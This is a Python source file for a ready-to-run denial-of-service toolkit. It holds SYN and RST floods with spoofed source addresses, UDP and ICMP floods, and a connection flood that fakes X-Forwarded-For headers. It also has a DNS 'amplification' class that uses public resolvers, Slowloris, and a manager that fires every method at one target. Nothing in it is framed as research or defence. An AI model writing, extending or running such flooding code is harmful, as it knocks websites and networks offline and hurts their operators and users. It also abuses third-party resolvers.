import asyncio, socket, struct, random, time, os, sys
from typing import Dict, List, Optional, Tuple

IS_WINDOWS = sys.platform == "win32"

PUBLIC_DNS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "149.112.112.112", "208.67.222.222", "208.67.220.220",
    "64.6.64.6", "64.6.65.6", "8.26.56.26", "8.20.247.20",
    "45.90.28.190", "45.90.30.190", "77.88.8.8", "77.88.8.1",
    "94.140.14.14", "94.140.15.15", "185.228.168.9", "185.228.169.9",
    "76.76.19.19", "76.223.122.150", "91.239.100.100", "89.233.43.71",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/136.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/136.0.0.0",
]

HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "OPTIONS", "DELETE", "PATCH", "TRACE", "CONNECT"]

def _fast_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


class TcpConnectionFlood:
    """TCP Connection Flood V3 — Persistent connection pool.
    Creates N keep-alive connections and reuses each for 1000+ requests.
    No TIME_WAIT issue because connections stay open."""
    def __init__(self):
        self.name = "TCP Connection Flood V3"
        self.sent = 0
        self.failed = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 500, port: int = 0) -> Dict:
        self.sent = 0
        self.failed = 0
        raw = target
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            return {"sent": 0, "failed": 0, "error": "resolve failed"}
        host = target.split(":")[0]
        is_https = "https://" in raw or port == 443
        dst_ports = [port] if port else ([443, 80])
        paths = ["/", f"/{random.randint(0,99999)}", "/wp-admin", "/admin", "/login"]

        ssl_ctx = None
        if is_https:
            import ssl
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

        end = time.time() + duration
        max_workers = min(threads, 2000)

        async def _persistent_worker(wid: int):
            p = random.choice(dst_ports)
            use_ssl = ssl_ctx and p in (443, 8443, 9443)
            while time.time() < end:
                try:
                    r, w = await asyncio.wait_for(asyncio.open_connection(ip, p, ssl=use_ssl), timeout=10)
                    req_count = 0
                    while time.time() < end and req_count < 500:
                        path = random.choice(paths)
                        ua = random.choice(USER_AGENTS)
                        method = random.choice(HTTP_METHODS)
                        req = (
                            f"{method} {path} HTTP/1.1\r\n"
                            f"Host: {host}\r\n"
                            f"User-Agent: {ua}\r\n"
                            f"Accept: */*\r\n"
                            f"Connection: keep-alive\r\n"
                            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\n"
                            f"\r\n"
                        ).encode()
                        try:
                            w.write(req)
                            await asyncio.wait_for(w.drain(), timeout=3)
                            await asyncio.wait_for(r.read(4096), timeout=2)
                            self.sent += 1
                            req_count += 1
                        except:
                            break
                    w.close()
                except:
                    self.failed += 1
                    await asyncio.sleep(0.05)

        workers = [asyncio.create_task(_persistent_worker(i)) for i in range(max_workers)]
        await asyncio.gather(*workers, return_exceptions=True)

        return {"sent": self.sent, "failed": self.failed}


class SynFloodV5:
    """SYN Flood — raw socket on Linux, TCP Connection Pool on Windows"""
    def __init__(self):
        self.name = "SYN Flood V5"
        self.sent = 0
        self.failed = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        if IS_WINDOWS:
            return await TcpConnectionFlood().attack(target, duration, threads * 5)
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            return {"sent": 0, "failed": 0, "error": "resolve failed"}
        port = int(target.split(":")[1]) if ":" in target else 80
        dst_ports = [port, 80, 443, 8080, 8443]

        async def syn_one(src_port: int, dst_port: int):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sip = socket.inet_aton(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
                dip = socket.inet_aton(ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s", (4<<4)+5, 0, 40, random.randint(1,65535), 0, 255, socket.IPPROTO_TCP, 0, sip, dip)
                tcp_hdr = struct.pack("!HHLLBBHHH", src_port, dst_port, random.randint(0,4294967295), 0, (5<<4)+0, 0x02, socket.htons(65535), 0, 0)
                ps_hdr = struct.pack("!4s4sBBH", sip, dip, 0, socket.IPPROTO_TCP, len(tcp_hdr))
                cks = _fast_checksum(ps_hdr + tcp_hdr)
                tcp_hdr = struct.pack("!HHLLBBHHH", src_port, dst_port, random.randint(0,4294967295), 0, (5<<4)+0, 0x02, socket.htons(65535), socket.htons(cks), 0)
                sock.sendto(ip_hdr + tcp_hdr, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                self.failed += 1

        end = time.time() + duration
        while time.time() < end:
            tasks = [syn_one(random.randint(1024,65535), random.choice(dst_ports)) for _ in range(min(threads*2, 500))]
            await asyncio.gather(*tasks, return_exceptions=True)
        return {"sent": self.sent, "failed": self.failed}


class UdpFloodV5:
    """UDP Flood V3 — multi-socket, non-stop, optimized throughput."""
    def __init__(self):
        self.name = "UDP Flood V3"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 500) -> Dict:
        self.sent = 0
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            return {"sent": 0, "error": "resolve failed"}
        ports = [443, 80, 8080, 8443, 53, 123, 161, 389, 8000, 8888]
        payloads = [os.urandom(random.randint(64, 1472)) for _ in range(10)]
        end = time.time() + duration

        async def _worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            local_sent = 0
            while time.time() < end:
                try:
                    sock.sendto(random.choice(payloads), (ip, random.choice(ports)))
                    self.sent += 1
                    local_sent += 1
                except:
                    pass
            sock.close()

        num = min(threads, 500)
        workers = [asyncio.create_task(_worker()) for _ in range(num)]
        await asyncio.gather(*workers, return_exceptions=True)
        return {"sent": self.sent}


class DnsAmplificationFlood:
    """DNS Amplification — ~40x amplification via 25+ public resolvers."""
    def __init__(self):
        self.name = "DNS Amplification Flood"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        self.sent = 0
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            socket.gethostbyname(target.split(":")[0])
        except:
            return {"sent": 0, "error": "resolve failed"}
        resolvers = PUBLIC_DNS[:]
        random.shuffle(resolvers)
        end = time.time() + duration

        async def _worker(rlist):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end:
                for r in rlist:
                    try:
                        tid = random.randint(0, 65535)
                        q = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + b"\x03isc\x03org\x00\x00\xFF\x00\x01"
                        sock.sendto(q, (r, 53))
                        self.sent += 1
                    except:
                        pass
            sock.close()

        num = min(threads, 50)
        chunk = max(1, len(resolvers) // num)
        chunks = [resolvers[i:i+chunk] for i in range(0, len(resolvers), chunk)]
        workers = [asyncio.create_task(_worker(c)) for c in chunks]
        await asyncio.gather(*workers, return_exceptions=True)
        return {"sent": self.sent}


class IcmpFloodV5:
    def __init__(self):
        self.name = "ICMP Flood V5"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        if IS_WINDOWS:
            return await UdpFloodV5().attack(target, duration, threads * 3)
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            return {"sent": 0, "error": "resolve failed"}
        end = time.time() + duration

        async def icmp_one():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                payload = os.urandom(random.randint(40, 200))
                hdr = struct.pack("!BBHHH", 8, 0, 0, random.randint(0,65535), random.randint(0,65535))
                cks = _fast_checksum(hdr + payload)
                hdr = struct.pack("!BBHHH", 8, 0, socket.htons(cks), random.randint(0,65535), random.randint(0,65535))
                sock.sendto(hdr + payload, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                pass

        while time.time() < end:
            tasks = [icmp_one() for _ in range(min(threads*2, 200))]
            await asyncio.gather(*tasks, return_exceptions=True)
        return {"sent": self.sent}


class TcpResetFlood:
    def __init__(self):
        self.name = "TCP RST Flood"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        if IS_WINDOWS:
            return await TcpConnectionFlood().attack(target, duration, threads * 3)
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            return {"sent": 0, "error": "resolve failed"}
        ports = [80, 443, 8080, 8443]
        end = time.time() + duration

        async def rst_one(sp, dp):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sip = socket.inet_aton(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
                dip = socket.inet_aton(ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s", (4<<4)+5, 0, 40, random.randint(1,65535), 0, 255, socket.IPPROTO_TCP, 0, sip, dip)
                tcp_hdr = struct.pack("!HHLLBBHHH", sp, dp, random.randint(0,4294967295), 0, (5<<4)+0, 0x14, socket.htons(65535), 0, 0)
                ps_hdr = struct.pack("!4s4sBBH", sip, dip, 0, socket.IPPROTO_TCP, len(tcp_hdr))
                cks = _fast_checksum(ps_hdr + tcp_hdr)
                tcp_hdr = struct.pack("!HHLLBBHHH", sp, dp, random.randint(0,4294967295), 0, (5<<4)+0, 0x14, socket.htons(65535), socket.htons(cks), 0)
                sock.sendto(ip_hdr + tcp_hdr, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                pass

        while time.time() < end:
            tasks = [rst_one(random.randint(1024,65535), random.choice(ports)) for _ in range(min(threads*2, 300))]
            await asyncio.gather(*tasks, return_exceptions=True)
        return {"sent": self.sent}


class SlowLorisV5:
    """Slowloris V3 — hold thousands of partial HTTP connections."""
    def __init__(self):
        self.name = "Slowloris V3"
        self.active = 0

    async def attack(self, target: str, duration: int = 60, connections: int = 500) -> Dict:
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            return {"active_connections": 0, "error": "resolve failed"}
        host = target.split(":")[0]
        ports = [443, 80]
        writers = []

        async def open_and_hold():
            try:
                r, w = await asyncio.open_connection(ip, random.choice(ports))
                path = f"/?{random.randint(0,999999)}"
                w.write(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nAccept: */*\r\nConnection: keep-alive\r\n".encode())
                await w.drain()
                writers.append(w)
                self.active += 1
                return w
            except:
                pass
            return None

        async def keep_alive(writer, end_time):
            while time.time() < end_time:
                try:
                    writer.write(f"X-a{random.randint(0,999999999)}: {random.randint(0,999999999)}\r\n".encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(3, 10))
                except:
                    break

        end = time.time() + duration
        open_tasks = [open_and_hold() for _ in range(min(connections, 1000))]
        await asyncio.gather(*open_tasks, return_exceptions=True)

        if writers:
            keep_tasks = [keep_alive(w, end) for w in writers]
            await asyncio.gather(*keep_tasks, return_exceptions=True)

        for w in writers:
            try: w.close()
            except: pass
        return {"active_connections": len(writers)}


class MultiVectorFlood:
    """Multi-Vector V3 — TCP + UDP + DNS Amp + SlowLoris simultaneously."""
    def __init__(self):
        self.name = "Multi-Vector L4 V3"
        self.stats = {}

    async def attack(self, target: str, duration: int = 30, threads: int = 500) -> Dict:
        stats = {}
        async def _run(cls, kw):
            r = await cls().attack(target, **kw)
            stats[cls.__name__] = r
            return r
        await asyncio.gather(
            _run(TcpConnectionFlood, {"duration": duration, "threads": threads}),
            _run(UdpFloodV5, {"duration": duration, "threads": threads}),
            _run(DnsAmplificationFlood, {"duration": duration, "threads": 50}),
            _run(SlowLorisV5, {"duration": duration, "connections": 300}),
            return_exceptions=True,
        )
        self.stats = stats
        total = sum(r.get("sent", 0) for r in stats.values())
        return {"sent": total, "stats": stats}


class L4AttackManager:
    def __init__(self):
        self.methods = {
            "syn": SynFloodV5(),
            "udp": UdpFloodV5(),
            "icmp": IcmpFloodV5(),
            "rst": TcpResetFlood(),
            "slowloris": SlowLorisV5(),
            "tcp_conn": TcpConnectionFlood(),
            "dns_amp": DnsAmplificationFlood(),
            "multi": MultiVectorFlood(),
        }

    async def launch_all(self, target: str, duration: int = 30) -> Dict:
        results = {}
        coros = []
        for name, method in self.methods.items():
            if name == "slowloris":
                coros.append((name, method.attack(target, duration=duration, connections=200)))
            elif name == "multi":
                coros.append((name, method.attack(target, duration=duration, threads=300)))
            elif name == "dns_amp":
                coros.append((name, method.attack(target, duration=duration, threads=50)))
            else:
                coros.append((name, method.attack(target, duration=duration, threads=150)))
        for name, coro in coros:
            try:
                results[name] = await asyncio.wait_for(coro, timeout=duration + 10)
            except Exception as e:
                results[name] = {"error": str(e)}
        return results

    async def probe_all(self, target: str) -> Dict:
        return {name: {"available": True, "note": "L4 method"} for name in self.methods}
